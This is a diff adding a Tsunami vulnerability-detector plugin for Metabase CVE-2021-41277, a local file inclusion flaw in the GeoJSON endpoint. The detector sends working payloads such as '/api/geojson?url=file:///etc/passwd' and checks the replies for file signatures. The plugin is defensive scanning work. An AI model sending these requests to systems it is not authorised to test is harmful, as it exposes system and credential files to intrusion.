@@ -1,0 +1,71 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MetabaseCve202141277Detector"
+  author: "C4o (syttcasd@gmail.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2021_41277"
+  }
+  severity: CRITICAL
+  title: "Metabase CVE-2021-41277 Local File Inclusion Vulnerability"
+  description: "Metabase is an open source data analytics platform. In affected versions a security issue has been discovered with the custom GeoJSON map (`admin->settings->maps->custom maps->add a map`) support and potential local file inclusion (including environment variables). URLs were not validated prior to being loaded. This issue is fixed in a new maintenance release (0.40.5 and 1.40.5), and any subsequent release after that."
+  recommendation: "upgrade to latest version"
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2021-41277"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "verify_geojson_file_inclusion"
+  http_request: {
+    method: GET
+    uri: [
+      "/api/geojson?url=file:///etc/passwd",
+      "/api/geojson?url=file:///c:/windows/win.ini",
+      "/api/geojson?url=file:///etc/hosts"
+    ]
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "root:x:0:0:" },
+          { body: {} contains: "root:*:0:0:" },
+          { body: {} contains: "; for 16-bit app support" },
+          { body: {} contains: "127.0.0.1\tlocalhost" },
+          { body: {} contains: "127.0.0.1 localhost" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "verify_geojson_file_inclusion"
+  ]
+}
